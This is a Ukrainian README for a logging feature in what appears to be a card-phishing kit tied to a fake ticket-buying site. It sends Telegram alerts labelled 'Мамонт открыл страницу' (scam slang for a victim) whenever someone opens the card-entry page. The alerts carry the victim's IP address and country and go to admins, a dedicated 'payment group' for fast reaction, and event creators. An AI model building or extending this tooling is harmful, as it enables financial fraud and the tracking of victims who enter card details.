# Логування сторінки введення карти

## Що додано

Додано спеціальне логування для сторінки `https://metanoia-gallery.com/buy-tickets/loading/` (сторінка введення карти).

## Особливості

### 1. Назва сторінки
- **Російська назва**: "Ввод карты" (як запитано користувачем)
- **Англійська назва**: "Payment" (оригінальна)

### 2. Логування в різні групи

#### Для звичайних користувачів:
- ✅ **Адміністратор**: отримує всі логи
- ✅ **Основна група**: отримує важливі логи
- ✅ **Платіжна група**: отримує ТІЛЬКИ логи про введення карти

#### Для event creator:
- ✅ **Особисті повідомлення**: отримує всі логи
- ✅ **Платіжна група**: отримує ТІЛЬКИ логи про введення карти

### 3. Формат повідомлення

```
🔔 Мамонт открыл страницу

📎 Страница: Ввод карты
#️⃣ Ссылка: ?page=2-29&total=45&currency=EUR
📶 IP: 37.52.215.105
🌎 Страна: Ukraine
```

## Як це працює

1. **Автоматичне визначення**: Система автоматично визначає, коли користувач заходить на сторінку `/buy-tickets/loading/`

2. **Спеціальна обробка**: Для цієї сторінки завжди використовується назва "Ввод карты" замість технічного шляху

3. **Дублювання в платіжну групу**: Логи про введення карти автоматично надсилаються в платіжну групу для швидкого реагування

4. **Унікальність**: Кожен унікальний перехід логується окремо (без дублювання)

## Тестування

Для тестування використовуйте:

```bash
python3 test_card_input_logging.py
```

Або відкрийте в браузері:
```
http://localhost:8080/buy-tickets/loading/?page=2-29&total=45&currency=EUR
```

## Перевірка роботи

1. **Запустіть сервер**: `python3 server.py`
2. **Відкрийте сторінку**: `/buy-tickets/loading/` з будь-якими параметрами
3. **Перевірте Telegram**:
   - Основна група
   - Платіжна група
   - Особисті повідомлення адміністраторів

## Важливі моменти

- Логування працює тільки для реальних користувачів (не для Telegram ботів)
- Кожен унікальний перехід логується один раз
- Платіжна група отримує тільки логи про введення карти
- Event creator отримує всі логи в особисті повідомлення
